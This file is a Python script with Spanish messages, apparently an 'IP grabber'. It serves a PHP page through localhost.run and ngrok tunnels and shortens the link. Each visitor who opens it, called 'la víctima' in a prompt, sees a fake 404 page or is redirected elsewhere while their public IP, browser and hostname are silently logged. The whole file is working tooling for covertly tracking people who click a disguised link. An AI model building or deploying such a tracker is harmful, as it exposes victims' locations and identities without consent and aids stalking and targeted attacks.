#!/usr/bin/python3

import os
import time
import json
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen
import pyshorteners

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text) + "\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

lh_file = "logs/lh.log"
ngrok_file = "logs/ngrok.log"

ngrok_log = open(ngrok_file, 'w')
lh_log = open(lh_file, 'w')

# Verificar si ngrok está instalado
if not os.path.isfile('server/ngrok'):
    print('\n\033[31m[!] Ngrok no está instalado.')
    print('\n\033[35m[~] Instalando ngrok...')
    os.system("bash modules/install_ngrok.sh")

logo = """\033[33m
        ▄▄▄▄▄▄▄▄
  █   ▄██████████▄            
 █▐   ████████████
 ▌▐  ██▄▀██████▀▄██
▐┼▐  ██▄▄▄▄██▄▄▄▄██
▐┼▐  ██████████████
▐▄▐████─▀▐▐▀█─█─▌▐██▄
  █████──────────▐███▌
  █▀▀██▄█─▄───▐─▄███▀
  █  ███████▄██████
     ██████████████
     █████████▐▌██▌
      ▐▀▐ ▌▀█▀ ▐ █
            ▐    ▌

     By:C0d1ngj4ndr3s     
"""

def check():
    processed_ips = set()  # Conjunto para almacenar las IPs ya procesadas
    while True:
        if os.path.isfile('ip.txt'):
            print('\n\033[94m[~] Información del dispositivo encontrada:')
            with open('ip.txt') as ip_file:
                lines = ip_file.readlines()
                
                # Filtrar las IPs nuevas y procesarlas
                for line in lines:
                    if line not in processed_ips:
                        processed_ips.add(line)
                        data = json.loads(line.strip())
                        print(f"\033[32m[~] IP Pública: {data['ip']}")
                        print(f"    Navegador: {data['user_agent']}")
                        print(f"    Hostname: {data['host']}")
                        print(f"    Hora: {data['time']}")
                        
                        # Guardar datos en un archivo separado
                        with open("ip_guardadas.txt", "a") as saved_ips:
                            saved_ips.write(json.dumps(data) + "\n")
            
            # Eliminar el archivo 'ip.txt' después de procesarlo
            os.remove("ip.txt")
        time.sleep(1)

def server():
    os.system("clear")
    print(logo)
    print('\033[35m[~] Iniciando servidor php...')
    var1 = input('\n\033[34m[~] ¿Quieres utilizar la página por defecto? (Error 404 HTML) [Y/n]: \033[0m')

    if var1.lower() == "y":
        if not isfile('index.php') or "index.html" not in cat('index.php'):
            with open('index.php', 'w') as file2:
                file2.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""")
        print('\n[~] Utilizando el puerto: 8080')
        print('\n[~] Creando enlace...')
        time.sleep(2)
        os.system("php -S localhost:8080 > /dev/null 2>&1 &")
        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)
        
        # Obtener la URL de localhost.run
        for i in range(10):
            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
            if lhr_url:
                break
            time.sleep(1)

        # Iniciar Ngrok
        bgtask(f"./server/ngrok http 8080", stdout=ngrok_log, stderr=ngrok_log)

        # Obtener la URL de ngrok
        for i in range(10):
            ngrok_url = grep("(https://[-0-9a-z.]{4,}.ngrok.io)", ngrok_file)
            if ngrok_url:
                break
            time.sleep(1)

        print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
        print(f'\n\033[32m[~] Ngrok: {ngrok_url}')
        
        try:
            s = pyshorteners.Shortener()
            ey = s.isgd.short(lhr_url)
            print(f'\n\033[34m[~] Link acortado: {ey}')
        except:
            print('\n\033[31m[!] Ha ocurrido un error al intentar acortar la URL.')
        
        print('\n\033[33m[~] Esperando datos...')
        check()

    elif var1.lower() == "n":
        link = input('\n[~] Ingresa una url para redirigir a la víctima (e.j: https://youtube.com): ')
        with open('index.php', 'w') as file:
            file.write("""<?php
include 'ip.php';
header('Location: {link}');
exit();
?>""".replace("{link}", link))
        
        print('\n[~] Utilizando el puerto: 8080')
        print('\n[~] Creando enlace...')
        os.system("php -S localhost:8080 > /dev/null 2>&1 &")
        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

        # Obtener la URL de localhost.run
        for i in range(10):
            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
            if lhr_url:
                break
            time.sleep(1)
        
        # Iniciar Ngrok
        bgtask(f"./server/ngrok http 8080", stdout=ngrok_log, stderr=ngrok_log)

        # Obtener la URL de ngrok
        for i in range(10):
            ngrok_url = grep("(https://[-0-9a-z.]{4,}.ngrok.io)", ngrok_file)
            if ngrok_url:
                break
            time.sleep(1)

        print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
        print(f'\n\033[32m[~] Ngrok: {ngrok_url}')

        try:
            s = pyshorteners.Shortener()
            ey = s.isgd.short(lhr_url)
            print(f'\n\033[34m[~] Link acortado: {ey}')
        except:
            print('\n\033[31m[!] Ha ocurrido un error al intentar acortar la URL.')
        
        print('\n[~] Esperando datos...')
        check()

def menu():
    try:
        os.system("killall php")
        os.system("clear")
        print(logo)
        print('\n\033[36m[1] Iniciar servidor php\033[0m')
        print('\033[36m[2] Salir\033[0m')
        T = int(input('\n\033[33m>> \033[0m'))
        if T == 1:
            server()
        elif T == 2:
            exit()
        else:
            menu()
    except KeyboardInterrupt:
        print("\n\033[31m[!] Proceso interrumpido.")
        append("Proceso interrumpido manualmente", error_file)
    except Exception as e:
        append(f"Error en el menú principal: {str(e)}", error_file)
        print("\n\033[31m[!] Ha ocurrido un error. Verifica los logs.")

if __name__ == "__main__":
    menu()